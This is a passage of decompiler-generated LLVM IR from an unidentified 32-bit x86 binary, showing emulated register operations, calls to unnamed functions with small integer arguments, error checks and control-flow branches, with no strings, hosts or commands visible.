  %v2_804e8aa = load i32, i32* %v1_804e8aa, align 4
  store i32 %v2_804e8aa, i32* @ebx, align 4
  store i32 0, i32* %v1_804e8aa, align 4
  store i32 6, i32* %v1_804e8a9, align 4
  %v3_804e8af = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804e8af, i32* %eax.global-to-local, align 4
  %v0_804e8b4 = load i32, i32* @esp, align 4
  %v1_804e8b4 = inttoptr i32 %v0_804e8b4 to i32*
  %v3_804e8b4 = add i32 %v0_804e8b4, 4
  %v1_804e8b5 = inttoptr i32 %v3_804e8b4 to i32*
  store i32 %v3_804e8af, i32* %v1_804e8b5, align 4
  %v1_804e8b7 = add i32 %v0_804e8b4, 8328
  store i32 %v1_804e8b7, i32* %eax.global-to-local, align 4
  store i32 %v1_804e8b7, i32* %v1_804e8b4, align 4
  %v3_804e8bf = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e8bf, i32* %eax.global-to-local, align 4
  %v0_804e8c4 = load i32, i32* @esp, align 4
  %v1_804e8c4 = add i32 %v0_804e8c4, 8328
  %v1_804e8cb = inttoptr i32 %v0_804e8c4 to i32*
  %v3_804e8cb = add i32 %v0_804e8c4, 4
  %v2_804e8cc = add i32 %v1_804e8c4, %v3_804e8bf
  store i32 %v2_804e8cc, i32* @esi, align 4
  %v1_804e8ce = inttoptr i32 %v3_804e8cb to i32*
  %v2_804e8ce = load i32, i32* %v1_804e8ce, align 4
  store i32 %v2_804e8ce, i32* @ebx, align 4
  %v0_804e8cf = load i32, i32* @edi, align 4
  store i32 %v0_804e8cf, i32* %v1_804e8ce, align 4
  %v0_804e8d0 = load i32, i32* @esi, align 4
  store i32 %v0_804e8d0, i32* %v1_804e8cb, align 4
  %v3_804e8d1 = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e8d1, i32* %eax.global-to-local, align 4
  store i32 %v3_804e8d1, i32* @ebx, align 4
  %v0_804e8d8 = load i32, i32* @esp, align 4
  %v1_804e8d8 = inttoptr i32 %v0_804e8d8 to i32*
  %v2_804e8d8 = load i32, i32* %v1_804e8d8, align 4
  store i32 %v2_804e8d8, i32* %eax.global-to-local, align 4
  %v3_804e8d8 = add i32 %v0_804e8d8, 4
  %v1_804e8d9 = inttoptr i32 %v3_804e8d8 to i32*
  store i32 0, i32* %v1_804e8d9, align 4
  store i32 7, i32* %v1_804e8d8, align 4
  %v3_804e8de = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804e8de, i32* %eax.global-to-local, align 4
  %v0_804e8e3 = load i32, i32* @esp, align 4
  %v1_804e8e3 = inttoptr i32 %v0_804e8e3 to i32*
  %v3_804e8e3 = add i32 %v0_804e8e3, 4
  %v1_804e8e4 = inttoptr i32 %v3_804e8e3 to i32*
  store i32 %v3_804e8de, i32* %v1_804e8e4, align 4
  %v0_804e8e6 = load i32, i32* @esi, align 4
  %v1_804e8e6 = load i32, i32* @ebx, align 4
  %v2_804e8e6 = add i32 %v1_804e8e6, %v0_804e8e6
  store i32 %v2_804e8e6, i32* %eax.global-to-local, align 4
  store i32 %v2_804e8e6, i32* %v1_804e8e3, align 4
  %v3_804e8ea = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e8ea, i32* %eax.global-to-local, align 4
  %v0_804e8ef = load i32, i32* @esp, align 4
  %v1_804e8ef = inttoptr i32 %v0_804e8ef to i32*
  %v3_804e8ef = add i32 %v0_804e8ef, 4
  %v1_804e8f0 = inttoptr i32 %v3_804e8ef to i32*
  %v2_804e8f0 = load i32, i32* %v1_804e8f0, align 4
  store i32 %v2_804e8f0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804e8f0, align 4
  store i32 6, i32* %v1_804e8ef, align 4
  %v3_804e8f5 = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804e8f5, i32* %eax.global-to-local, align 4
  %v0_804e8fa = load i32, i32* @esp, align 4
  %v1_804e8fa = inttoptr i32 %v0_804e8fa to i32*
  %v3_804e8fa = add i32 %v0_804e8fa, 4
  %v1_804e8fb = inttoptr i32 %v3_804e8fa to i32*
  %v2_804e8fb = load i32, i32* %v1_804e8fb, align 4
  store i32 %v2_804e8fb, i32* @ebx, align 4
  store i32 %v3_804e8f5, i32* %v1_804e8fb, align 4
  %v1_804e8fd = add i32 %v0_804e8fa, 8264
  store i32 %v1_804e8fd, i32* %eax.global-to-local, align 4
  store i32 %v1_804e8fd, i32* %v1_804e8fa, align 4
  %v3_804e905 = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e905, i32* %eax.global-to-local, align 4
  %v0_804e90a = load i32, i32* @esp, align 4
  %v1_804e90a = add i32 %v3_804e905, 8264
  %v2_804e911 = add i32 %v1_804e90a, %v0_804e90a
  store i32 %v2_804e911, i32* @esi, align 4
  %v1_804e913 = inttoptr i32 %v0_804e90a to i32*
  %v2_804e913 = load i32, i32* %v1_804e913, align 4
  store i32 %v2_804e913, i32* %eax.global-to-local, align 4
  %v3_804e913 = add i32 %v0_804e90a, 4
  %v1_804e914 = inttoptr i32 %v3_804e913 to i32*
  %v0_804e915 = load i32, i32* @edi, align 4
  store i32 %v0_804e915, i32* %v1_804e914, align 4
  %v0_804e916 = load i32, i32* @esi, align 4
  store i32 %v0_804e916, i32* %v1_804e913, align 4
  %v3_804e917 = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e917, i32* %eax.global-to-local, align 4
  %v0_804e91c = load i32, i32* @esp, align 4
  %v1_804e91c = inttoptr i32 %v0_804e91c to i32*
  %v3_804e91c = add i32 %v0_804e91c, 4
  %v1_804e91d = inttoptr i32 %v3_804e91c to i32*
  store i32 %v3_804e917, i32* @ebx, align 4
  store i32 0, i32* %v1_804e91d, align 4
  store i32 11, i32* %v1_804e91c, align 4
  %v3_804e924 = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804e924, i32* %eax.global-to-local, align 4
  %v0_804e929 = load i32, i32* @esp, align 4
  %v1_804e929 = inttoptr i32 %v0_804e929 to i32*
  %v3_804e929 = add i32 %v0_804e929, 4
  %v1_804e92a = inttoptr i32 %v3_804e929 to i32*
  store i32 %v3_804e924, i32* %v1_804e92a, align 4
  %v0_804e92c = load i32, i32* @esi, align 4
  %v1_804e92c = load i32, i32* @ebx, align 4
  %v2_804e92c = add i32 %v1_804e92c, %v0_804e92c
  store i32 %v2_804e92c, i32* %eax.global-to-local, align 4
  store i32 %v2_804e92c, i32* %v1_804e929, align 4
  %v3_804e930 = call i32 @function_8052640(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e930, i32* %eax.global-to-local, align 4
  %v0_804e935 = load i32, i32* @esp, align 4
  %v1_804e935 = inttoptr i32 %v0_804e935 to i32*
  store i32 6, i32* %v1_804e935, align 4
  %v2_804e93c = call i32 @function_8051c50(i8 0)
  store i32 %v2_804e93c, i32* %eax.global-to-local, align 4
  %v0_804e941 = load i32, i32* @esp, align 4
  %v1_804e941 = inttoptr i32 %v0_804e941 to i32*
  store i32 7, i32* %v1_804e941, align 4
  %v2_804e948 = call i32 @function_8051c50(i8 0)
  %v0_804e94d = load i32, i32* @esp, align 4
  %v1_804e950 = add i32 %v0_804e94d, 8
  %v2_804e950 = inttoptr i32 %v1_804e950 to i32*
  store i32 4095, i32* %v2_804e950, align 4
  %v1_804e955 = add i32 %v0_804e94d, 4168
  store i32 %v1_804e955, i32* @edi, align 4
  %v2_804e95c = add i32 %v0_804e94d, 4
  %v3_804e95c = inttoptr i32 %v2_804e95c to i32*
  store i32 %v1_804e955, i32* %v3_804e95c, align 4
  %v1_804e95d = add i32 %v0_804e94d, 8328
  store i32 %v1_804e95d, i32* %eax.global-to-local, align 4
  %v3_804e964 = inttoptr i32 %v0_804e94d to i32*
  store i32 %v1_804e95d, i32* %v3_804e964, align 4
  %v4_804e965 = call i32 @function_8052d92(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e965, i32* %eax.global-to-local, align 4
  %v0_804e96a = load i32, i32* @esp, align 4
  %v1_804e96a = add i32 %v0_804e96a, 16
  store i32 %v4_804e965, i32* @ebx, align 4
  %v10_804e96f = icmp eq i32 %v4_804e965, -1
  br i1 %v10_804e96f, label %dec_label_pc_804ea97, label %dec_label_pc_804e978

dec_label_pc_804e978:                             ; preds = %dec_label_pc_804e883
  %v2_804e978 = add i32 %v4_804e965, 4152
  %v3_804e978 = add i32 %v2_804e978, %v1_804e96a
  %v4_804e978 = inttoptr i32 %v3_804e978 to i8*
  store i8 0, i8* %v4_804e978, align 1
  %v0_804e980 = load i32, i32* @esp, align 4
  %v1_804e983 = add i32 %v0_804e980, -16
  %v2_804e983 = inttoptr i32 %v1_804e983 to i32*
  store i32 10, i32* %v2_804e983, align 4
  %v2_804e985 = call i32 @function_8051cd0(i8 0)
  store i32 %v2_804e985, i32* %eax.global-to-local, align 4
  %v0_804e98a = load i32, i32* @esp, align 4
  %v1_804e98a = inttoptr i32 %v0_804e98a to i32*
  %v3_804e98a = add i32 %v0_804e98a, 4
  %v1_804e98b = inttoptr i32 %v3_804e98a to i32*
  %v2_804e98b = load i32, i32* %v1_804e98b, align 4
  store i32 %v2_804e98b, i32* @esi, align 4
  store i32 0, i32* %v1_804e98b, align 4
  store i32 10, i32* %v1_804e98a, align 4
  %v3_804e990 = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  %v0_804e995 = load i32, i32* @esp, align 4
  %v2_804e998 = add i32 %v0_804e995, 8
  %v3_804e998 = inttoptr i32 %v2_804e998 to i32*
  store i32 %v3_804e990, i32* %v3_804e998, align 4
  %v0_804e999 = load i32, i32* @ebx, align 4
  %v1_804e999 = add i32 %v0_804e999, -1
  store i32 %v1_804e999, i32* %eax.global-to-local, align 4
  %v2_804e99c = add i32 %v0_804e995, 4
  %v3_804e99c = inttoptr i32 %v2_804e99c to i32*
  store i32 %v1_804e999, i32* %v3_804e99c, align 4
  %v1_804e99d = add i32 %v0_804e995, 4168
  store i32 %v1_804e99d, i32* @edi, align 4
  %v3_804e9a4 = inttoptr i32 %v0_804e995 to i32*
  store i32 %v1_804e99d, i32* %v3_804e9a4, align 4
  %v4_804e9a5 = call i32 @function_8052910(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804e9aa = load i32, i32* @esp, align 4
  %v1_804e9ad = add i32 %v4_804e9a5, 1
  %v8_804e9ad = icmp eq i32 %v1_804e9ad, 0
  store i32 %v1_804e9ad, i32* %eax.global-to-local, align 4
  br i1 %v8_804e9ad, label %dec_label_pc_804e9cd, label %dec_label_pc_804e9b0

dec_label_pc_804e9b0:                             ; preds = %dec_label_pc_804e978
  %v1_804e9b3 = add i32 %v0_804e9aa, 4168
  store i32 %v1_804e9b3, i32* %eax.global-to-local, align 4
  %v3_804e9ba = inttoptr i32 %v0_804e9aa to i32*
  store i32 %v1_804e9b3, i32* %v3_804e9ba, align 4
  %v0_804e9bb = call i32 @function_8052eb0()
  store i32 %v0_804e9bb, i32* %eax.global-to-local, align 4
  %v0_804e9c0 = load i32, i32* @esp, align 4
  %v1_804e9c0 = inttoptr i32 %v0_804e9c0 to i32*
  %v2_804e9c0 = load i32, i32* %v1_804e9c0, align 4
  store i32 %v2_804e9c0, i32* %eax.global-to-local, align 4
  %v3_804e9c0 = add i32 %v0_804e9c0, 4
  %v1_804e9c1 = inttoptr i32 %v3_804e9c0 to i32*
  store i32 9, i32* %v1_804e9c1, align 4
  %v0_804e9c4 = load i32, i32* @ebp, align 4
  store i32 %v0_804e9c4, i32* %v1_804e9c0, align 4
  %v4_804e9c5 = call i32 @function_8052ca0(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e9c5, i32* %eax.global-to-local, align 4
  %v0_804e9ca = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e9cd

dec_label_pc_804e9cd:                             ; preds = %dec_label_pc_804e978, %dec_label_pc_804e9b0
  %v0_804e9cd.in = phi i32 [ %v0_804e9aa, %dec_label_pc_804e978 ], [ %v0_804e9ca, %dec_label_pc_804e9b0 ]
  %v2_804e9d0 = inttoptr i32 %v0_804e9cd.in to i32*
  store i32 10, i32* %v2_804e9d0, align 4
  %v2_804e9d2 = call i32 @function_8051c50(i8 0)
  store i32 %v2_804e9d2, i32* %eax.global-to-local, align 4
  %v0_804e9d7 = call i32 @function_8052c15()
  store i32 %v0_804e9d7, i32* %eax.global-to-local, align 4
  %v0_804e9dc = load i32, i32* @esp, align 4
  %v1_804e9dc = add i32 %v0_804e9dc, 16
  %v0_804e9df = load i32, i32* @ebp, align 4
  %v12_804e9df = icmp eq i32 %v0_804e9df, %v0_804e9d7
  br i1 %v12_804e9df, label %dec_label_pc_804ea08, label %dec_label_pc_804e9e3

dec_label_pc_804e9e3:                             ; preds = %dec_label_pc_804e9cd
  %v0_804e9e3 = call i32 @function_8052c3b()
  store i32 %v0_804e9e3, i32* %eax.global-to-local, align 4
  %v0_804e9e8 = load i32, i32* @ebp, align 4
  %v12_804e9e8 = icmp eq i32 %v0_804e9e8, %v0_804e9e3
  %v0_804ea0a.pre = load i32, i32* @esp, align 4
  br i1 %v12_804e9e8, label %dec_label_pc_804ea08, label %dec_label_pc_804e9ec

dec_label_pc_804e9ec:                             ; preds = %dec_label_pc_804e9e3
  %v2_804e9ec = add i32 %v0_804ea0a.pre, -4
  %v3_804e9ec = inttoptr i32 %v2_804e9ec to i32*
  store i32 %v0_804e9e3, i32* %v3_804e9ec, align 4
  %v2_804e9ed = add i32 %v0_804ea0a.pre, -8
  %v3_804e9ed = inttoptr i32 %v2_804e9ed to i32*
  store i32 %v0_804e9e3, i32* %v3_804e9ed, align 4
  %v0_804e9ee = load i32, i32* @global_var_8057320.22, align 32
  store i32 %v0_804e9ee, i32* %eax.global-to-local, align 4
  %v2_804e9f3 = add i32 %v0_804ea0a.pre, -12
  %v3_804e9f3 = inttoptr i32 %v2_804e9f3 to i32*
  store i32 %v0_804e9ee, i32* %v3_804e9f3, align 4
  %v1_804e9f4 = add i32 %v0_804ea0a.pre, 4152
  store i32 %v1_804e9f4, i32* @edi, align 4
  %v2_804e9fb = add i32 %v0_804ea0a.pre, -16
  %v3_804e9fb = inttoptr i32 %v2_804e9fb to i32*
  store i32 %v1_804e9f4, i32* %v3_804e9fb, align 4
  %v0_804e9fc = call i32 @function_8052990()
  store i32 %v0_804e9fc, i32* %eax.global-to-local, align 4
  %v0_804ea01 = load i32, i32* @esp, align 4
  %v3_804ea04 = trunc i32 %v0_804e9fc to i8
  %v4_804ea04 = icmp eq i8 %v3_804ea04, 0
  br i1 %v4_804ea04, label %dec_label_pc_804ea63, label %dec_label_pc_804e9ec.dec_label_pc_804ea08_crit_edge

dec_label_pc_804e9ec.dec_label_pc_804ea08_crit_edge: ; preds = %dec_label_pc_804e9ec
  %v1_804ea01 = add i32 %v0_804ea01, 16
  %v0_804ea08.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804ea08

dec_label_pc_804ea08:                             ; preds = %dec_label_pc_804e9e3, %dec_label_pc_804e9ec.dec_label_pc_804ea08_crit_edge, %dec_label_pc_804e9cd
  %v0_804ea0a = phi i32 [ %v1_804ea01, %dec_label_pc_804e9ec.dec_label_pc_804ea08_crit_edge ], [ %v1_804e9dc, %dec_label_pc_804e9cd ], [ %v0_804ea0a.pre, %dec_label_pc_804e9e3 ]
  %v0_804ea08 = phi i32 [ %v0_804ea08.pre, %dec_label_pc_804e9ec.dec_label_pc_804ea08_crit_edge ], [ %v0_804e9d7, %dec_label_pc_804e9cd ], [ %v0_804e9e3, %dec_label_pc_804e9e3 ]
  store i32 %v0_804ea08, i32* @esi, align 4
  %v1_804ea0a = add i32 %v0_804ea0a, 8
  %v2_804ea0a = inttoptr i32 %v1_804ea0a to i32*
  %v3_804ea0a = load i32, i32* %v2_804ea0a, align 4
  store i32 %v3_804ea0a, i32* @ebx, align 4
  br label %dec_label_pc_804e820

dec_label_pc_804ea13:                             ; preds = %dec_label_pc_804e820
  %v1_804ea16 = add i32 %v0_804e82d, 32
  %v2_804ea16 = inttoptr i32 %v1_804ea16 to i32*
  %v3_804ea16 = load i32, i32* %v2_804ea16, align 4
  store i32 %v3_804ea16, i32* @eax, align 4
  %v3_804ea1a = inttoptr i32 %v0_804e82d to i32*
  store i32 %v3_804ea16, i32* %v3_804ea1a, align 4
  %v0_804ea1b = call i32 @function_8052f14()
  store i32 %v0_804ea1b, i32* %eax.global-to-local, align 4
  %v0_804ea20 = load i32, i32* @esp, align 4
  %v1_804ea20 = add i32 %v0_804ea20, 16
  br label %dec_label_pc_804e7e7

dec_label_pc_804ea28:                             ; preds = %dec_label_pc_804e862
  %v0_804ea28 = load i32, i32* @ebp, align 4
  %v7_804ea2e = icmp sgt i32 %v0_804ea28, 400
  br i1 %v7_804ea2e, label %dec_label_pc_804ea34, label %dec_label_pc_804e820

dec_label_pc_804ea34:                             ; preds = %dec_label_pc_804ea28
  store i32 -858993459, i32* %eax.global-to-local, align 4
  %v1_804ea39 = add i32 %v0_804e86e, 28
  %v2_804ea39 = inttoptr i32 %v1_804ea39 to i32*
  %v3_804ea39 = load i32, i32* %v2_804ea39, align 4
  %v10_804ea39 = udiv i32 %v3_804ea39, 2
  store i32 %v10_804ea39, i32* @edx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804ea47 = load i32, i32* %v2_804ea39, align 4
  %v15_804ea47 = icmp eq i32 %v3_804ea47, 0
  %v1_804ea4b = icmp eq i1 %v15_804ea47, false
  br i1 %v1_804ea4b, label %dec_label_pc_804e820, label %dec_label_pc_804ea51

dec_label_pc_804ea51:                             ; preds = %dec_label_pc_804ea34
  %v2_804ea54 = inttoptr i32 %v0_804e86e to i32*
  store i32 1, i32* %v2_804ea54, align 4
  %v1_804ea56 = call i32 @function_8054770(i32 0)
  store i32 %v1_804ea56, i32* %eax.global-to-local, align 4
  %v0_804ea5b = load i32, i32* @esp, align 4
  %v1_804ea5b = add i32 %v0_804ea5b, 16
  br label %dec_label_pc_804e820

dec_label_pc_804ea63:                             ; preds = %dec_label_pc_804e9ec
  %v2_804ea63 = add i32 %v0_804ea01, 12
  %v3_804ea63 = inttoptr i32 %v2_804ea63 to i32*
  store i32 %v0_804e9fc, i32* %v3_804ea63, align 4
  %v2_804ea64 = add i32 %v0_804ea01, 8
  %v3_804ea64 = inttoptr i32 %v2_804ea64 to i32*
  store i32 %v0_804e9fc, i32* %v3_804ea64, align 4
  %v1_804ea65 = add i32 %v0_804ea01, 4
  %v2_804ea65 = inttoptr i32 %v1_804ea65 to i32*
  store i32 0, i32* %v2_804ea65, align 4
  %v1_804ea67 = add i32 %v0_804ea01, 4168
  store i32 %v1_804ea67, i32* %eax.global-to-local, align 4
  %v3_804ea6e = inttoptr i32 %v0_804ea01 to i32*
  store i32 %v1_804ea67, i32* %v3_804ea6e, align 4
  %v3_804ea6f = call i32 @function_8052cd2(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804ea6f, i32* %eax.global-to-local, align 4
  %v0_804ea74 = load i32, i32* @esp, align 4
  store i32 %v3_804ea6f, i32* @ebx, align 4
  %v10_804ea79 = icmp eq i32 %v3_804ea6f, -1
  %v1_804ea7c = icmp eq i1 %v10_804ea79, false
  br i1 %v1_804ea7c, label %dec_label_pc_804ea8b, label %dec_label_pc_804ea7e

dec_label_pc_804ea7e:                             ; preds = %dec_label_pc_804ea63
  %v0_804ea7e = load i32, i32* @edi, align 4
  %v2_804ea7e = add i32 %v0_804ea74, 12
  %v3_804ea7e = inttoptr i32 %v2_804ea7e to i32*
  store i32 %v0_804ea7e, i32* %v3_804ea7e, align 4
  %v0_804ea7f = load i32, i32* @edi, align 4
  %v2_804ea7f = add i32 %v0_804ea74, 8
  %v3_804ea7f = inttoptr i32 %v2_804ea7f to i32*
  store i32 %v0_804ea7f, i32* %v3_804ea7f, align 4
  %v1_804ea80 = add i32 %v0_804ea74, 4
  %v2_804ea80 = inttoptr i32 %v1_804ea80 to i32*
  store i32 9, i32* %v2_804ea80, align 4
  %v0_804ea82 = load i32, i32* @ebp, align 4
  %v3_804ea82 = inttoptr i32 %v0_804ea74 to i32*
  store i32 %v0_804ea82, i32* %v3_804ea82, align 4
  %v4_804ea83 = call i32 @function_8052ca0(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ea83, i32* %eax.global-to-local, align 4
  %v0_804ea88 = load i32, i32* @esp, align 4
  %v0_804ea8e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ea8b

dec_label_pc_804ea8b:                             ; preds = %dec_label_pc_804ea63, %dec_label_pc_804ea7e
  %v0_804ea8e = phi i32 [ %v3_804ea6f, %dec_label_pc_804ea63 ], [ %v0_804ea8e.pre, %dec_label_pc_804ea7e ]
  %v0_804ea8b.in = phi i32 [ %v0_804ea74, %dec_label_pc_804ea63 ], [ %v0_804ea88, %dec_label_pc_804ea7e ]
  %v3_804ea8e = inttoptr i32 %v0_804ea8b.in to i32*
  store i32 %v0_804ea8e, i32* %v3_804ea8e, align 4
  %v1_804ea8f = call i32 @function_8052bc1(i32 0)
  store i32 %v1_804ea8f, i32* %eax.global-to-local, align 4
  %v0_804ea94 = load i32, i32* @esp, align 4
  %v1_804ea94 = add i32 %v0_804ea94, 16
  br label %dec_label_pc_804ea97

dec_label_pc_804ea97:                             ; preds = %dec_label_pc_804e883, %dec_label_pc_804ea8b
  %v1_804ea97 = phi i32 [ %v1_804e96a, %dec_label_pc_804e883 ], [ %v1_804ea94, %dec_label_pc_804ea8b ]
  %v0_804ea97 = load i32, i32* @esi, align 4
  %v2_804ea97 = add i32 %v1_804ea97, -4
  %v3_804ea97 = inttoptr i32 %v2_804ea97 to i32*
  store i32 %v0_804ea97, i32* %v3_804ea97, align 4
  %v0_804ea98 = load i32, i32* @esi, align 4
  %v2_804ea98 = add i32 %v1_804ea97, -8
  %v3_804ea98 = inttoptr i32 %v2_804ea98 to i32*
  store i32 %v0_804ea98, i32* %v3_804ea98, align 4
  %v1_804ea99 = add i32 %v1_804ea97, -12
  %v2_804ea99 = inttoptr i32 %v1_804ea99 to i32*
  store i32 0, i32* %v2_804ea99, align 4
  %v1_804ea9b = add i32 %v1_804ea97, 8312
  %v2_804eaa2 = add i32 %v1_804ea97, -16
  %v3_804eaa2 = inttoptr i32 %v2_804eaa2 to i32*
  store i32 %v1_804ea9b, i32* %v3_804eaa2, align 4
  %v3_804eaa3 = call i32 @function_8052cd2(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v1_804eaa8 = load i32, i32* @esp, align 4
  %v2_804eaa8 = add i32 %v1_804eaa8, 56
  %v3_804eaa8 = inttoptr i32 %v2_804eaa8 to i32*
  store i32 %v3_804eaa3, i32* %v3_804eaa8, align 4
  %v0_804eaac = load i32, i32* @esp, align 4
  %v1_804eaaf = add i32 %v3_804eaa3, 1
  %v8_804eaaf = icmp eq i32 %v1_804eaaf, 0
  store i32 %v1_804eaaf, i32* @eax, align 4
  br i1 %v8_804eaaf, label %dec_label_pc_804ecec, label %dec_label_pc_804eab6

dec_label_pc_804eab6:                             ; preds = %dec_label_pc_804ea97
  %v2_804eab9 = inttoptr i32 %v0_804eaac to i32*
  store i32 12, i32* %v2_804eab9, align 4
  %v2_804eabb = call i32 @function_8051cd0(i8 0)
  store i32 %v2_804eabb, i32* %eax.global-to-local, align 4
  %v0_804eac0 = load i32, i32* @esp, align 4
  %v1_804eac0 = inttoptr i32 %v0_804eac0 to i32*
  store i32 13, i32* %v1_804eac0, align 4
  %v2_804eac7 = call i32 @function_8051cd0(i8 0)
  store i32 %v2_804eac7, i32* %eax.global-to-local, align 4
  %v0_804eacc = load i32, i32* @esp, align 4
  %v1_804eacc = inttoptr i32 %v0_804eacc to i32*
  store i32 14, i32* %v1_804eacc, align 4
  %v2_804ead3 = call i32 @function_8051cd0(i8 0)
  store i32 %v2_804ead3, i32* %eax.global-to-local, align 4
  %v0_804ead8 = load i32, i32* @esp, align 4
  %v1_804ead8 = inttoptr i32 %v0_804ead8 to i32*
  store i32 15, i32* %v1_804ead8, align 4
  %v2_804eadf = call i32 @function_8051cd0(i8 0)
  store i32 %v2_804eadf, i32* %eax.global-to-local, align 4
  %v0_804eae4 = load i32, i32* @esp, align 4
  %v1_804eae4 = inttoptr i32 %v0_804eae4 to i32*
  store i32 16, i32* %v1_804eae4, align 4
  %v2_804eaeb = call i32 @function_8051cd0(i8 0)
  store i32 %v2_804eaeb, i32* %eax.global-to-local, align 4
  %v0_804eaf0 = load i32, i32* @esp, align 4
  %v1_804eaf0 = inttoptr i32 %v0_804eaf0 to i32*
  %v3_804eaf0 = add i32 %v0_804eaf0, 4
  %v1_804eaf1 = inttoptr i32 %v3_804eaf0 to i32*
  %v1_804eaf2 = add i32 %v0_804eaf0, 8436
  store i32 %v1_804eaf2, i32* %eax.global-to-local, align 4
  store i32 %v1_804eaf2, i32* %v1_804eaf1, align 4
  store i32 12, i32* %v1_804eaf0, align 4
  %v3_804eafc = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804eafc, i32* %eax.global-to-local, align 4
  %v1_804eb01 = load i32, i32* @esp, align 4
  %v2_804eb01 = add i32 %v1_804eb01, 52
  %v3_804eb01 = inttoptr i32 %v2_804eb01 to i32*
  store i32 %v3_804eafc, i32* %v3_804eb01, align 4
  %v0_804eb05 = load i32, i32* @esp, align 4
  %v1_804eb05 = inttoptr i32 %v0_804eb05 to i32*
  %v3_804eb05 = add i32 %v0_804eb05, 4
  %v1_804eb06 = inttoptr i32 %v3_804eb05 to i32*
  %v1_804eb07 = add i32 %v0_804eb05, 8432
  store i32 %v1_804eb07, i32* %eax.global-to-local, align 4
  store i32 %v1_804eb07, i32* %v1_804eb06, align 4
  store i32 13, i32* %v1_804eb05, align 4
  %v3_804eb11 = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804eb11, i32* %eax.global-to-local, align 4
  %v1_804eb16 = load i32, i32* @esp, align 4
  %v2_804eb16 = add i32 %v1_804eb16, 48
  %v3_804eb16 = inttoptr i32 %v2_804eb16 to i32*
  store i32 %v3_804eb11, i32* %v3_804eb16, align 4
  %v0_804eb1a = load i32, i32* @esp, align 4
  %v1_804eb1a = inttoptr i32 %v0_804eb1a to i32*
  %v3_804eb1a = add i32 %v0_804eb1a, 4
  %v1_804eb1b = inttoptr i32 %v3_804eb1a to i32*
  %v2_804eb1b = load i32, i32* %v1_804eb1b, align 4
  store i32 %v2_804eb1b, i32* @edi, align 4
  %v1_804eb1c = add i32 %v0_804eb1a, 8428
  store i32 %v1_804eb1c, i32* %eax.global-to-local, align 4
  store i32 %v1_804eb1c, i32* %v1_804eb1b, align 4
  store i32 14, i32* %v1_804eb1a, align 4
  %v3_804eb26 = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804eb26, i32* %eax.global-to-local, align 4
  %v1_804eb2b = load i32, i32* @esp, align 4
  %v2_804eb2b = add i32 %v1_804eb2b, 44
  %v3_804eb2b = inttoptr i32 %v2_804eb2b to i32*
  store i32 %v3_804eb26, i32* %v3_804eb2b, align 4
  %v0_804eb2f = load i32, i32* @esp, align 4
  %v1_804eb2f = inttoptr i32 %v0_804eb2f to i32*
  %v3_804eb2f = add i32 %v0_804eb2f, 4
  %v1_804eb30 = inttoptr i32 %v3_804eb2f to i32*
  %v2_804eb30 = load i32, i32* %v1_804eb30, align 4
  store i32 %v2_804eb30, i32* @ebx, align 4
  %v1_804eb31 = add i32 %v0_804eb2f, 8440
  store i32 %v1_804eb31, i32* %eax.global-to-local, align 4
  store i32 %v1_804eb31, i32* %v1_804eb30, align 4
  store i32 15, i32* %v1_804eb2f, align 4
  %v3_804eb3b = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804eb3b, i32* %eax.global-to-local, align 4
  %v1_804eb40 = load i32, i32* @esp, align 4
  %v2_804eb40 = add i32 %v1_804eb40, 40
  %v3_804eb40 = inttoptr i32 %v2_804eb40 to i32*
  store i32 %v3_804eb3b, i32* %v3_804eb40, align 4
  %v0_804eb44 = load i32, i32* @esp, align 4
  %v1_804eb44 = inttoptr i32 %v0_804eb44 to i32*
  %v3_804eb44 = add i32 %v0_804eb44, 4
  %v1_804eb45 = inttoptr i32 %v3_804eb44 to i32*
  %v1_804eb46 = add i32 %v0_804eb44, 8424
  store i32 %v1_804eb46, i32* %eax.global-to-local, align 4
  store i32 %v1_804eb46, i32* %v1_804eb45, align 4
  store i32 16, i32* %v1_804eb44, align 4
  %v3_804eb50 = call i32 @function_8051c20(i32 0, i32* nonnull @0)
  store i32 %v3_804eb50, i32* %eax.global-to-local, align 4
  %v1_804eb55 = load i32, i32* @esp, align 4
  %v2_804eb55 = add i32 %v1_804eb55, 36
  %v3_804eb55 = inttoptr i32 %v2_804eb55 to i32*
  store i32 %v3_804eb50, i32* %v3_804eb55, align 4
  %v0_804eb59 = load i32, i32* @esp, align 4
  %v1_804eb59 = add i32 %v0_804eb59, 16
  %v0_804eb5c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eb5c

dec_label_pc_804eb5c:                             ; preds = %dec_label_pc_804ec58, %dec_label_pc_804ec70.backedge, %dec_label_pc_804ec67, %dec_label_pc_804eab6
